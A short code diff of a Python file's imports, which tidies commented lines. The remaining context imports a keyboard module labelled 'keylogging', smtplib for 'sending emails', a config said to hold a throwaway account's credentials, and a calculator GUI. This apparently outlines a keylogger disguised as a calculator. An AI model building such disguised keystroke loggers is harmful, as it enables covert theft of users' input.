@@ -1,5 +1,3 @@
-# import sys
-
 import keyboard # keylogging
 import smtplib # sending emails
 
@@ -10,9 +8,6 @@ from datetime import datetime
 # includes email address and pw of my throwaway account
 import config
 import helper
-
-# import text-based calculator (redundant with tkinter)
-# import txt_based_calc as txtc
 
 # import calculator GUI
 import calc
